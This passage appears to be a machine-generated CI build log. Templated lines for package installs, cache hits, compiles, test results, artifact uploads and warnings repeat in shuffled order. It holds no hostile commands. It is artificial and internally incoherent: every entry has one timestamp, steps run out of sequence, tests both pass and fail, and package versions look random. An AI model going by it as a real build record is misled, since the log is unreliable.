usage\n[12:00:34] INFO: Processing request\nCache hit for key-2726\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nInstalling lodash@2.5.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (20MB)\nInstalling axios@1.18.0\n\u2713 test completed\nInstalling prettier@4.13.0\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_user_create (78ms)\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (35MB)\nInstalling webpack@2.18.0\nStep 3/10: Building\nCache hit for key-9306\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-7405\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_auth_login (372ms)\nInstalling lodash@5.9.0\nCompiling src/service.java...\nInstalling jest@2.11.0\nArtifact uploaded: build.tar.gz (33MB)\nInstalling lodash@4.0.0\nStep 8/10: Building\nInstalling lodash@4.5.0\nCache hit for key-2077\nCache hit for key-3669\n  PASS: test_cache_hit (51ms)\n[12:00:34] INFO: Processing request\nCache hit for key-5632\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-7990\nCompiling src/app.ts...\nStep 9/10: Building\nInstalling react@5.5.0\nCache hit for key-9551\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\nCache hit for key-1239\n[12:00:34] INFO: Processing request\nStep 9/10: Building\n  PASS: test_cache_hit (451ms)\nCache hit for key-1200\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (50ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 lint completed\nCache hit for key-8325\nInstalling webpack@4.3.0\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCache hit for key-5010\n\u2713 build completed\nInstalling react@3.0.0\nFAILED: test_api_health\nInstalling axios@1.0.0\n[12:00:34] INFO: Processing request\nInstalling jest@1.15.0\nArtifact uploaded: build.tar.gz (16MB)\nInstalling webpack@1.13.0\nInstalling react@4.15.0\nWARNING: react has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (3MB)\nStep 4/10: Building\nInstalling eslint@5.8.0\n  PASS: test_api_health (426ms)\n  PASS: test_api_health (17ms)\nInstalling lodash@2.9.0\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_user_create (142ms)\nStep 7/10: Building\nInstalling eslint@5.5.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nStep 7/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (20MB)\nInstalling lodash@4.17.0\nCompiling src/handler.rs...\nCompiling src/main.py...\nCache hit for key-9433\n\u2713 lint completed\nCompiling src/app.ts...\nStep 6/10: Building\nCompiling src/service.java...\nFAILED: test_auth_login\n  PASS: test_user_create (163ms)\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling axios@2.18.0\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (27MB)\nWARNING: lodash has known vulnerabilities\nStep 4/10: Building\nCompiling src/app.ts...\n[12:00:34] WARN: Deprecated API usage\nCompiling src/utils.go...\nStep 10/10: Building\nCache hit for key-5359\n[12:00:34] INFO: Processing request\nInstalling prettier@2.20.0\n\u2713 build completed\n\u2713 test completed\nCache hit for key-9588\nCompiling src/utils.go...\nInstalling react@2.10.0\nWARNING: react has known vulnerabilities\n[12:00:34] INFO: Processing request\n=== Step type_check completed ===\n=== Step: restore_cache ===\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-7993\n  PASS: test_auth_login (233ms)\nStep 3/10: Building\nCache hit for key-6492\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (35MB)\nWARNING: webpack has known vulnerabilities\nCompiling src/handler.rs...\nWARNING: express has known vulnerabilities\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-4517\n  PASS: test_auth_login (183ms)\n\u2713 build completed\nInstalling react@3.12.0\n\u2713 lint completed\nCache hit for key-4014\nCache hit for key-8351\nCache hit for key-2677\n\u2713 build completed\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nWARNING: react has known vulnerabilities\nFAILED: test_user_create\nStep 8/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 build completed\nCompiling src/index.js...\n  PASS: test_db_connect (208ms)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (285ms)\nCompiling src/utils.go...\nCache hit for key-3902\nCompiling src/utils.go...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/handler.rs...\nCompiling src/app.ts...\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nFAILED: test_cache_hit\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:34] WARN: Deprecated API usage\nCompiling src/service.java...\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-1975\nStep 2/10: Building\n\u2713 build completed\n\u2713 lint completed\nInstalling lodash@2.12.0\nCompiling src/app.ts...\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\nCompiling src/main.py...\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nInstalling prettier@2.14.0\n\u2713 lint completed\n  PASS: test_cache_hit (351ms)\n\u2717 build failed with exit code 53\n\u2713 build completed\nCache hit for key-7290\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\nInstalling lodash@1.9.0\n\u2713 lint completed\nStep 5/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nStep 5/10: Building\n\u2713 lint completed\nFAILED: test_db_connect\nCache hit for key-9535\nStep 5/10: Building\nStep 8/10: Building\nCompiling src/index.js...\nInstalling react@4.10.0\nCompiling src/main.py...\nCompiling src/main.py...\nStep 8/10: Building\nStep 10/10: Building\nCompiling src/index.js...\nCompiling src/service.java...\n  PASS: test_db_connect (11ms)\n  PASS: test_auth_login (412ms)\nCompiling src/main.py...\nStep 7/10: Building\nCompiling src/main.py...\n  PASS: test_auth_login (207ms)\nCompiling src/index.js...\nStep 7/10: Building\n\u2713 build completed\nInstalling axios@5.10.0\n\u2717 build failed with exit code 82\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_cache_hit (472ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/10: Building\n\u2713 lint completed\nInstalling express@3.16.0\nCache hit for key-8655\nInstalling jest@4.2.0\nInstalling lodash@5.18.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\nCompiling src/app.ts...\n  PASS: test_user_create (263ms)\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/main.py...\nInstalling eslint@5.0.0\nArtifact uploaded: build.tar.gz (32MB)\nStep 6/10: Building\nInstalling webpack@5.7.0\nStep 2/10: Building\n[12:00:34] INFO: Processing request\nStep 1/10: Building\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_cache_hit (48ms)\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5695\n\u2713 lint completed\nInstalling axios@1.5.0\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:34] INFO: Processing request\nInstalling express@5.9.0\nStep 2/10: Building\nInstalling lodash@4.10.0\n  PASS: test_db_connect (37ms)\nInstalling react@3.2.0\n[12:00:34] ERROR: Connection failed\n[12:00:34] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nStep 3/10: Building\nInstalling lodash@3.11.0\nCache hit for key-1403\n[12:00:34] INFO: Processing request\nStep 5/10: Building\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 1/10: Building\n  PASS: test_cache_hit (390ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1383\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-1112\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (360ms)\nCache hit for key-2523\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nCache hit for key-3312\nStep 6/10: Building\nCache hit for key-4693\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/utils.go...\nCache hit for key-3429\nInstalling axios@3.1.0\n\u2713 lint completed\nInstalling express@3.1.0\n  PASS: test_auth_login (306ms)\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nStep 2/10: Building\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nCache hit for key-6504\nArtifact uploaded: build.tar.gz (18MB)\nStep 7/10: Building\nInstalling eslint@2.19.0\n  PASS: test_db_connect (98ms)\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (23ms)\n  PASS: test_api_health (105ms)\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: jest has known vulnerabilities\n\u2717 build failed with exit code 16\nCache hit for key-7666\nCompiling src/app.ts...\nStep 10/10: Building\nCache hit for key-7001\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-4224\n  PASS: test_cache_hit (450ms)\nCache hit for key-9504\n[12:00:34] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nStep 7/10: Building\nInstalling jest@4.10.0\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-3066\n\u2713 lint completed\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-7039\n[12:00:34] INFO: Processing request\n\u2717 build failed with exit code 109\nStep 1/10: Building\nInstalling jest@5.4.0\nInstalling express@1.11.0\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n\u2717 build failed with exit code 49\n[12:00:34] INFO: Processing request\nCache hit for key-1114\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling express@1.13.0\n\u2713 lint completed\nCache hit for key-7481\n  PASS: test_auth_login (442ms)\n  PASS: test_cache_hit (429ms)\n  PASS: test_user_create (49ms)\nInstalling webpack@1.0.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@5.11.0\nStep 5/10: Building\nStep 5/10: Building\nInstalling prettier@1.19.0\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (24MB)\nStep 1/10: Building\n  PASS: test_cache_hit (218ms)\nCache hit for key-6804\nStep 9/10: Building\nInstalling prettier@4.0.0\n  PASS: test_cache_hit (328ms)\nCompiling src/utils.go...\nStep 1/10: Building\n  PASS: test_cache_hit (334ms)\nCompiling src/utils.go...\n\u2713 build completed\nException: ValueError\nWARNING: axios has known vulnerabilities\nInstalling express@2.6.0\nStep 6/10: Building\n\u2713 test completed\n  PASS: test_api_health (380ms)\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\n  PASS: test_cache_hit (490ms)\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nStep 1/10: Building\nException: ValueError\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:34] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_user_create (50ms)\n[12:00:34] INFO: Processing request\nStep 9/10: Building\nStep 6/10: Building\nInstalling express@1.16.0\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (45MB)\nStep 2/10: Building\nCompiling src/handler.rs...\n  PASS: test_api_health (67ms)\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-4544\nCache hit for key-9440\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (403ms)\n  PASS: test_cache_hit (333ms)\nException: RuntimeError\nInstalling axios@5.15.0\nCache hit for key-7155\nStep 10/10: Building\nCache hit for key-3396\nInstalling react@1.11.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (121ms)\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\n  PASS: test_db_connect (35ms)\nArtifact uploaded: build.tar.gz (2MB)\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\n  PASS: test_db_connect (320ms)\nStep 6/10: Building\nInstalling prettier@5.13.0\n[12:00:34] INFO: Processing request\nInstalling react@4.0.0\nCache hit for key-1779\n[12:00:34] INFO: Processing request\nStep 5/10: Building\nStep 1/10: Building\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nStep 1/10: Building\nInstalling axios@2.0.0\n[12:00:34] WARN: Deprecated API usage\n\u2717 build failed with exit code 10\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nStep 2/10: Building\n\u2713 test completed\n  PASS: test_api_health (185ms)\nStep 2/10: Building\n  PASS: test_db_connect (218ms)\nStep 5/10: Building\nCache hit for key-1717\n\u2717 build failed with exit code 76\nInstalling react@5.18.0\nInstalling react@4.6.0\nCache hit for key-4283\n\u2713 test completed\n  PASS: test_user_create (41ms)\nException: ValueError\nStep 7/10: Building\nCache hit for key-1531\n\u2713 build completed\nCache hit for key-8897\n\u2713 test completed\n\u2713 build completed\nInstalling express@1.15.0\nStep 6/10: Building\n  PASS: test_user_create (19ms)\n\u2713 lint completed\nStep 9/10: Building\nCache hit for key-9663\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n\u2713 test completed\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCache hit for key-8352\nStep 9/10: Building\n  PASS: test_db_connect (309ms)\nCache hit for key-2882\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nCompiling src/utils.go...\nInstalling webpack@5.2.0\nInstalling jest@4.20.0\n  PASS: test_db_connect (297ms)\nStep 9/10: Building\nWARNING: eslint has known vulnerabilities\n[12:00:34] INFO: Processing request\nInstalling express@2.0.0\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-5347\n  PASS: test_api_health (6ms)\n  PASS: test_db_connect (319ms)\n[12:00:34] INFO: Processing request\nCache hit for key-9018\n  PASS: test_auth_login (458ms)\nCompiling src/main.py...\nCompiling src/utils.go...\n[12:00:34] ERROR: Connection failed\nCompiling src/service.java...\n  PASS: test_api_health (108ms)\nInstalling lodash@3.17.0\nCompiling src/app.ts...\nCache hit for key-1019\nCache hit for key-8728\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_db_connect (447ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (12MB)\nStep 4/10: Building\nInstalling lodash@5.15.0\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-4070\nCache hit for key-1910\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:34] INFO: Processing request\nWARNING: jest has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (352ms)\nException: NullPointerException\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-9539\nStep 4/10: Building\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_cache_hit (210ms)\nInstalling eslint@5.15.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (6MB)\nInstalling axios@2.4.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/utils.go...\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\nCache hit for key-3849\nArtifact uploaded: build.tar.gz (15MB)\nInstalling axios@4.7.0\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (376ms)\nInstalling webpack@3.0.0\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_cache_hit (161ms)\nCompiling src/handler.rs...\nCompiling src/service.java...\nException: TypeError\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_api_health (475ms)\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] ERROR: Connection failed\nInstalling eslint@2.9.0\n  PASS: test_cache_hit (280ms)\n\u2713 lint completed\nInstalling lodash@5.16.0\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nInstalling webpack@5.7.0\nCompiling src/service.java...\nInstalling axios@3.5.0\nCache hit for key-3348\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nWARNING: jest has known vulnerabilities\nInstalling axios@4.20.0\n  PASS: test_cache_hit (398ms)\nInstalling react@4.5.0\nCache hit for key-1081\nCompiling src/index.js...\n[12:00:34] WARN: Deprecated API usage\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_api_health (270ms)\nCache hit for key-3270\nInstalling jest@4.18.0\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_user_create (77ms)\n\u2713 test completed\n  PASS: test_db_connect (69ms)\nStep 5/10: Building\n[12:00:34] WARN: Deprecated API usage\n\u2717 build failed with exit code 119\n\u2713 test completed\n\u2713 build completed\nWARNING: axios has known vulnerabilities\nStep 1/10: Building\nException: RuntimeError\n  PASS: test_user_create (467ms)\n\u2713 lint completed\nCache hit for key-3574\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (111ms)\n  PASS: test_api_health (260ms)\nCache hit for key-9150\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/utils.go...\nCache hit for key-4709\n  PASS: test_cache_hit (340ms)\n  PASS: test_cache_hit (395ms)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-1628\n[12:00:34] INFO: Processing request\nCache hit for key-9358\n\u2717 build failed with exit code 66\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-9916\nInstalling eslint@4.8.0\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/index.js...\nException: NullPointerException\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_user_create (435ms)\n[12:00:34] INFO: Processing request\nInstalling react@3.16.0\n  PASS: test_cache_hit (195ms)\nInstalling eslint@4.3.0\nCache hit for key-8049\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/utils.go...\nCache hit for key-2677\nException: RuntimeError\n  PASS: test_cache_hit (140ms)\nInstalling react@2.12.0\nCache hit for key-8418\n  PASS: test_cache_hit (355ms)\n[12:00:34] INFO: Processing request\nWARNING: axios has known vulnerabilities\n[12:00:34] INFO: Processing request\nInstalling express@1.14.0\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/handler.rs...\nCache hit for key-5920\nInstalling webpack@1.14.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\nCache hit for key-1764\nCache hit for key-3842\nCache hit for key-6488\nException: TypeError\n[12:00:34] ERROR: Connection failed\nInstalling express@2.5.0\nStep 5/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (217ms)\nCache hit for key-5455\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/index.js...\nCache hit for key-7403\nFAILED: test_user_create\n  PASS: test_cache_hit (440ms)\nInstalling express@1.1.0\n\u2713 lint completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-1669\nInstalling express@3.6.0\nInstalling eslint@3.0.0\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/main.py...\nCompiling src/app.ts...\n  PASS: test_auth_login (478ms)\nCache hit for key-5920\nCompiling src/app.ts...\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:34] INFO: Processing request\nInstalling lodash@2.19.0\nCompiling src/main.py...\n\u2717 build failed with exit code 60\nCache hit for key-2742\n\u2713 test completed\nStep 4/10: Building\nCompiling src/service.java...\nInstalling prettier@1.12.0\nStep 5/10: Building\nCache hit for key-4509\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nInstalling prettier@1.17.0\n  PASS: test_cache_hit (262ms)\n  PASS: test_db_connect (448ms)\nWARNING: react has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_api_health (461ms)\n  PASS: test_api_health (154ms)\n\u2713 lint completed\nStep 3/10: Building\nStep 3/10: Building\n[12:00:34] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (367ms)\nCache hit for key-4223\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_db_connect (250ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8357\nInstalling axios@1.19.0\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nCompiling src/service.java...\nCache hit for key-6533\nCache hit for key-3960\n[12:00:34] INFO: Processing request\nInstalling lodash@1.6.0\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (257ms)\nStep 3/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (12MB)\n\u2717 build failed with exit code 109\nStep 7/10: Building\n\u2713 lint completed\nStep 2/10: Building\nWARNING: prettier has known vulnerabilities\nCache hit for key-5686\nCompiling src/app.ts...\nCompiling src/handler.rs...\nCache hit for key-3154\n\u2713 build completed\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-7251\nCache hit for key-9839\nCompiling src/handler.rs...\nCompiling src/index.js...\nCompiling src/service.java...\nCompiling src/app.ts...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 build completed\nStep 1/10: Building\nCompiling src/app.ts...\nInstalling react@1.13.0\nStep 9/10: Building\nInstalling eslint@4.6.0\n[12:00:34] INFO: Processing request\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\n\u2713 lint completed\nStep 3/10: Building\nStep 5/10: Building\nCache hit for key-3033\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (29MB)\nStep 6/10: Building\nCompiling src/service.java...\nCompiling src/index.js...\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/utils.go...\nCache hit for key-7385\n\u2717 build failed with exit code 27\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_cache_hit (293ms)\nCompiling src/main.py...\nStep 8/10: Building\nCache hit for key-3271\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCache hit for key-5101\nInstalling axios@1.14.0\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (120ms)\nCache hit for key-5263\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_auth_login (264ms)\nInstalling lodash@2.3.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (485ms)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: webpack has known vulnerabilities\nCache hit for key-9220\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (299ms)\nCache hit for key-2669\nCompiling src/service.java...\n\u2713 build completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 7/10: Building\nCache hit for key-9379\nCompiling src/index.js...\nWARNING: axios has known vulnerabilities\nInstalling axios@4.12.0\nCompiling src/index.js...\nInstalling lodash@3.6.0\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (31MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nStep 4/10: Building\nInstalling react@4.7.0\n  PASS: test_auth_login (148ms)\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_api_health (16ms)\nCompiling src/index.js...\nCache hit for key-3023\nCompiling src/app.ts...\n\u2713 test completed\nInstalling eslint@2.12.0\nInstalling webpack@2.10.0\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_db_connect (381ms)\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\nStep 3/10: Building\nStep 10/10: Building\nCompiling src/handler.rs...\nCompiling src/app.ts...\nException: NullPointerException\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (26MB)\nStep 2/10: Building\nCompiling src/index.js...\n  PASS: test_api_health (351ms)\n  PASS: test_api_health (336ms)\n\u2713 build completed\n[12:00:34] ERROR: Connection failed\nCache hit for key-3740\n  PASS: test_db_connect (369ms)\nInstalling lodash@4.15.0\nInstalling axios@2.19.0\nCompiling src/main.py...\nCompiling src/index.js...\nStep 7/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\nInstalling express@1.14.0\nCache hit for key-8969\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_cache_hit (404ms)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nStep 10/10: Building\n  PASS: test_api_health (37ms)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCache hit for key-8037\nCompiling src/utils.go...\nStep 3/10: Building\nCache hit for key-7939\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-1567\nCompiling src/utils.go...\n  PASS: test_db_connect (339ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@3.0.0\nCompiling src/main.py...\nCache hit for key-2308\nCompiling src/handler.rs...\n\u2713 build completed\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nStep 10/10: Building\n\u2713 lint completed\nCompiling src/index.js...\n  PASS: test_db_connect (470ms)\nArtifact uploaded: build.tar.gz (18MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nInstalling eslint@4.3.0\n  PASS: test_db_connect (64ms)\n\u2713 build completed\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n\u2713 build completed\nCache hit for key-7798\n\u2713 test completed\nInstalling react@1.5.0\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCache hit for key-8392\n[12:00:34] INFO: Processing request\nCache hit for key-7020\n\u2713 test completed\nCompiling src/app.ts...\n\u2713 build completed\nInstalling axios@3.7.0\nArtifact uploaded: build.tar.gz (5MB)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nInstalling eslint@3.3.0\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (331ms)\n[12:00:34] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API 